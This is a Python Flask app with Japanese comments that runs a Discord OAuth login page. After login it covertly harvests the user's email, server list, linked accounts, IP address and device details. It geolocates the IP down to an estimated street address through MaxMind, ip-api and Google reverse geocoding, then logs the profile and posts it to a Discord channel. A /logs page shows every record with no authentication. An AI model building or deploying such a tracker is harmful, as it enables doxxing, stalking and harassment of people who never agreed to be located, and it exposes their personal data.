from flask import Flask, request, render_template
import requests, json, os, threading
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot
from user_agents import parse
import geoip2.database

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")

GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "GeoLite2-City.mmdb")
GOOGLE_API_KEY = os.getenv("GOOGLE_GEOCODING_API_KEY")  # 任意（細かい住所が欲しい場合は必須）


def get_client_ip():
    # X-Forwarded-For 対応（プロキシや Render 等の環境を考慮）
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr


def geoip_maxmind(ip):
    """ローカルの MaxMind DB（GeoLite2/GeoIP2）から取得を試みる"""
    if not os.path.exists(GEOIP_DB_PATH):
        return None
    try:
        with geoip2.database.Reader(GEOIP_DB_PATH) as reader:
            rec = reader.city(ip)
            # ロケール日本語を優先して取得（なければ英語）
            country = (rec.country.names.get('ja') or rec.country.name) if rec.country else None
            region = (rec.subdivisions.most_specific.names.get('ja') or rec.subdivisions.most_specific.name) if rec.subdivisions and rec.subdivisions.most_specific else None
            city = (rec.city.names.get('ja') or rec.city.name) if rec.city else None
            postal = rec.postal.code if rec.postal else None
            isp = None
            # MaxMind の GeoIP2 City には ISP は含まれない（ISP は別 DB）。ここは None になることが多い。
            lat = rec.location.latitude
            lon = rec.location.longitude
            return {
                "source": "maxmind",
                "ip": ip,
                "country": country or "不明",
                "region": region or "不明",
                "city": city or "不明",
                "postal": postal or "不明",
                "isp": isp or "不明",
                "lat": lat,
                "lon": lon
            }
    except Exception as e:
        # 読み取り失敗時は None
        print("MaxMind error:", e)
        return None


def reverse_geocode_google(lat, lon):
    """Google Geocoding API を使って緯度経度から住所成分を取得（APIキー必須）"""
    if not GOOGLE_API_KEY or lat is None or lon is None:
        return None
    try:
        url = "https://maps.googleapis.com/maps/api/geocode/json"
        params = {
            "latlng": f"{lat},{lon}",
            "key": GOOGLE_API_KEY,
            "language": "ja"
        }
        r = requests.get(url, params=params, timeout=5)
        j = r.json()
        if j.get("status") != "OK" or not j.get("results"):
            return None
        comp = j["results"][0]["address_components"]
        # address_components から都道府県・市区町村・町名・丁目等を抽出
        addr = {"full_address": j["results"][0].get("formatted_address")}
        for c in comp:
            types = c.get("types", [])
            if "administrative_area_level_1" in types:
                addr["prefecture"] = c.get("long_name")
            if "locality" in types or "administrative_area_level_2" in types:
                # locality が市区町村、ない場合は管轄レベルで fallback
                addr.setdefault("city", c.get("long_name"))
            if "sublocality" in types or "sublocality_level_1" in types:
                addr.setdefault("sublocality", c.get("long_name"))
            if "route" in types:
                addr.setdefault("route", c.get("long_name"))
            if "street_number" in types:
                addr.setdefault("street_number", c.get("long_name"))
            if "postal_code" in types:
                addr.setdefault("postal_code", c.get("long_name"))
        return addr
    except Exception as e:
        print("Google Geocode error:", e)
        return None


def ipapi_fallback(ip):
    """MaxMindが使えない場合のフォールバック。ip-api.com でISPなども取得"""
    try:
        res = requests.get(
            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query",
            timeout=5
        )
        data = res.json()
        if data.get("status") != "success":
            return None
        return {
            "source": "ip-api",
            "ip": data.get("query"),
            "country": data.get("country", "不明"),
            "region": data.get("regionName", "不明"),
            "city": data.get("city", "不明"),
            "postal": data.get("zip", "不明"),
            "isp": data.get("isp", "不明"),
            "as": data.get("as", "不明"),
            "lat": data.get("lat"),
            "lon": data.get("lon"),
            "proxy": data.get("proxy", False),
            "hosting": data.get("hosting", False)
        }
    except Exception as e:
        print("ip-api error:", e)
        return None


def get_geo_info(ip):
    """優先順: MaxMind -> ip-api -> 最終的に不明"""
    # 1) MaxMind
    mm = geoip_maxmind(ip)
    if mm:
        # MaxMind では ISP が取れない場合が多いので ip-api で補完しておく（同じIPで照会）
        ipapi = ipapi_fallback(ip)
        if ipapi:
            # ip-api の isp/as を優先してマージ
            mm["isp"] = ipapi.get("isp", mm.get("isp"))
            mm["as"] = ipapi.get("as")
            mm["proxy"] = ipapi.get("proxy", False)
            mm["hosting"] = ipapi.get("hosting", False)
        # 可能なら Google 逆ジオで詳細住所を補完
        if mm.get("lat") and mm.get("lon"):
            g = reverse_geocode_google(mm["lat"], mm["lon"])
            if g:
                mm["reverse_geocode"] = g
        return mm

    # 2) ip-api フォールバック（MaxMindが無い/失敗時）
    ipf = ipapi_fallback(ip)
    if ipf:
        # できれば Google 逆ジオで補完
        if ipf.get("lat") and ipf.get("lon"):
            g = reverse_geocode_google(ipf["lat"], ipf["lon"])
            if g:
                ipf["reverse_geocode"] = g
        return ipf

    # 3) 最終: 不明
    return {
        "source": "unknown",
        "ip": ip,
        "country": "不明",
        "region": "不明",
        "city": "不明",
        "postal": "不明",
        "isp": "不明",
        "lat": None,
        "lon": None,
        "proxy": False,
        "hosting": False
    }


def save_log(discord_id, structured_data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    structured_data["timestamp"] = now
    logs[discord_id]["history"].append(structured_data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)


@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email guilds connections"
    }
    try:
        res = requests.post(token_url, data=data, headers=headers, timeout=10)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth, timeout=10).json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth, timeout=10).json()
    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth, timeout=10).json()

    # サーバー参加処理（任意）
    try:
        requests.put(
            f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
            headers={
                "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
                "Content-Type": "application/json"
            },
            json={"access_token": access_token},
            timeout=10
        )
    except Exception as e:
        print("guild join error:", e)

    # IP取得とユーザーエージェント解析
    ip = get_client_ip()
    # ローカルIPの場合は外部ipサービスで取得
    if ip.startswith(("127.", "10.", "192.", "172.")):
        try:
            ip = requests.get("https://api.ipify.org", timeout=5).text
        except:
            pass

    geo = get_geo_info(ip)
    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)

    avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"

    structured_data = {
        "discord": {
            "username": user.get("username"),
            "discriminator": user.get("discriminator"),
            "id": user.get("id"),
            "email": user.get("email"),
            "avatar_url": avatar_url,
            "locale": user.get("locale"),
            "verified": user.get("verified"),
            "mfa_enabled": user.get("mfa_enabled"),
            "premium_type": user.get("premium_type"),
            "flags": user.get("flags"),
            "public_flags": user.get("public_flags"),
            "guilds": guilds,
            "connections": connections
        },
        "ip_info": geo,
        "user_agent": {
            "raw": ua_raw,
            "os": ua.os.family,
            "browser": ua.browser.family,
            "device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
            "is_bot": ua.is_bot
        }
    }

    save_log(user["id"], structured_data)

    # Embed整形（見やすく）
    try:
        d = structured_data["discord"]
        ipinfo = structured_data["ip_info"]
        uainfo = structured_data["user_agent"]

        desc_lines = [
            f"**名前:** {d['username']}#{d['discriminator']}",
            f"**ID:** {d['id']}",
            f"**メール:** {d.get('email')}",
            f"**IP:** {ipinfo.get('ip')}",
            f"**国:** {ipinfo.get('country')}",
            f"**県:** {ipinfo.get('region')}",
            f"**市区町村:** {ipinfo.get('city')}",
            f"**郵便:** {ipinfo.get('postal') or ipinfo.get('zip')}",
            f"**ISP:** {ipinfo.get('isp')}",
            f"**AS:** {ipinfo.get('as')}",
            f"**緯度/経度:** {ipinfo.get('lat')},{ipinfo.get('lon')}",
            f"**プロバイダ推定/Proxy:** {ipinfo.get('proxy')} / Hosting: {ipinfo.get('hosting')}",
            f"**UA:** {uainfo.get('raw')}",
            f"**OS:** {uainfo.get('os')} / ブラウザ: {uainfo.get('browser')}",
            f"**デバイス:** {uainfo.get('device')} / Bot判定: {uainfo.get('is_bot')}"
        ]

        # もし Google 逆ジオ情報があれば追記（より詳細な住所成分）
        if ipinfo.get("reverse_geocode"):
            rg = ipinfo["reverse_geocode"]
            desc_lines.append(f"**推定住所（逆ジオ）:** {rg.get('full_address')}")
            # 都道府県・市区町村があれば優先的に表示
            if rg.get("prefecture"):
                desc_lines.append(f"**逆ジオ 都道府県:** {rg.get('prefecture')}")
            if rg.get("city"):
                desc_lines.append(f"**逆ジオ 市区町村:** {rg.get('city')}")
            if rg.get("sublocality"):
                desc_lines.append(f"**逆ジオ 町名等:** {rg.get('sublocality')}")
            if rg.get("route") or rg.get("street_number"):
                desc_lines.append(f"**逆ジオ 詳細:** {rg.get('route') or ''} {rg.get('street_number') or ''}")

        embed_data = {
            "title": "✅ 新しいアクセスログ",
            "description": "\n".join(desc_lines),
            "thumbnail": {"url": d["avatar_url"]}
        }

        # 既存の bot.send_log(embed=...) を想定して呼び出し
        bot.loop.create_task(bot.send_log(embed=embed_data))

        # プロキシ/ホスティングが疑われる場合の通知
        if ipinfo.get("proxy") or ipinfo.get("hosting"):
            bot.loop.create_task(bot.send_log(
                f"⚠️ **不審なアクセス検出**\n{d['username']}#{d['discriminator']} (ID: {d['id']})\nIP: {ipinfo.get('ip')} / Proxy: {ipinfo.get('proxy')} / Hosting: {ipinfo.get('hosting')}"
            ))

        # 任意: 役職付与など
        try:
            bot.loop.create_task(bot.assign_role(d["id"]))
        except Exception:
            pass

    except Exception as e:
        print("Embed送信エラー:", e)

    return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])


@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    return render_template("logs.html", logs=logs)


def run_bot():
    bot.run(DISCORD_BOT_TOKEN)


if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    # 本番では gunicorn 等で起動推奨
    app.run(host="0.0.0.0", port=10000, debug=False)
